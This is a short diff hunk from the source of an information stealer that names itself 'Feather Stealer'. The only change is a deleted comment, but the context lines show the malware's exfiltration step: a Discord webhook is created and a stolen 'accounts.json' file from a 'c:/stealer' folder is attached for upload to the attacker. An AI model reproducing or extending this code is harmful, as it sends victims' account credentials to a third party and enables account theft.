@@ -21,7 +21,6 @@ retrieve_file(source_file_path, destination_file_path)
 
 webhook = DiscordWebhook(url="paste your webhook here", username="Feather Stealer")
 
-# send two images
 with open("c:/stealer/accounts.json", "rb") as f:
     webhook.add_file(file=f.read(), filename="accounts.json")
 
